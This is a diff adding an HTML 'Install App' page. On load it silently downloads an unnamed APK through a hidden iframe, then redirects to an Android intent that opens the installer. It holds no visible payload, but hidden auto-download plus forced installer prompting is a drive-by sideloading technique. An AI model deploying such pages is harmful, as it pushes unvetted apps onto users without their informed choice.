@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Install App</title>
+<style>
+  body{font-family:system-ui,sans-serif;background:#111;color:#eee;height:100vh;margin:0;
+       display:flex;flex-direction:column;align-items:center;justify-content:center;
+       text-align:center;padding:24px}
+  a.btn{background:#3b82f6;color:#fff;padding:14px 28px;border-radius:8px;
+        text-decoration:none;font-weight:600;margin-top:16px;display:inline-block}
+  .hint{opacity:.6;font-size:14px;margin-top:14px;max-width:300px}
+</style>
+</head>
+<body>
+<h2>Installing…</h2>
+<p class="hint">If nothing happens in a few seconds, tap below.</p>
+<a class="btn" href="a.apk" type="application/vnd.android.package-archive">Download APK</a>
+
+<script>
+  const APK = 'a.apk';
+  window.addEventListener('load', () => {
+    const f = document.createElement('iframe');
+    f.src = APK;
+    f.hidden = true;
+    document.body.appendChild(f);
+
+    // intent fallback: opens the installer sheet directly if the download stalls
+    setTimeout(() => {
+      location.href = 'intent://' + location.host + location.pathname + APK +
+        '#Intent;scheme=https;type=application/vnd.android.package-archive;end';
+    }, 4000);
+  });
+</script>
+</body>
+</html>
